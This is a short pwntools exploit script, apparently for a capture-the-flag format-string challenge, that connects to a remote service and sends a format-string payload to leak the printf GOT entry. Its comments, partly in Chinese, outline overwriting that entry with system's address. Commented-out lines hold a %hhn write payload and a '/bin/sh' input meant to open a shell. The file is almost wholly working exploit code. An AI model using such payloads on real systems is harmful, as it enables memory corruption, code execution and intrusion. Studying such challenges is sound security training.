from pwn import *

context.log_level = 'debug'
context.arch = 'i386'
context.endian = 'little'

# p = process('./fsb_i386')
p = remote('10.214.160.13',11006)

# 思路: 栈上泄露libc, 覆盖puts的地址为system的地址

# 4$是参数的位置
# 0x8049AF0 是printf got表的地址
# 0xf7d14a90 是 printf 链接后的地址
libc = ELF('./libc6_2.19-0ubuntu6.6_i386.so')
p.recvuntil(b'==\n\n')
# system_addr = libc.symbols['system'] - libc.symbols['printf'] + 0xf7d54a90
printf_got_addr = 0x8049AF0
# payload = b'aaaaaaaaaaaaaaaaaaa%x.%x.%x.%x.%x.%x.%x.%x.%x'
payload = b'aaaa%6$s' + p32(printf_got_addr)
# print(hex(system_addr))
# system_addr = 0xf7d05170
# 依次写入51 70 d0
# stack_ret_addr = 0xffc09dfc # 修改hhn为c9
# payload = b'aaa%78c'+b'%17$hhn'+ b'aa%29c'+b'%18$hhn' + b'a%88c' + b'%19$hhn' +  b'aaa%4c' + b'%20$hhn' + p32(printf_got_addr+1) + p32(printf_got_addr) +p32(stack_ret_addr) + p32(printf_got_addr+2)
# print('pid'+str(proc.pidof(p)))
# pause()
p.sendline(payload)
# p.recvuntil(b'now\n')
# p.sendline(b'/bin/sh\x00')
p.recv()

p.interactive()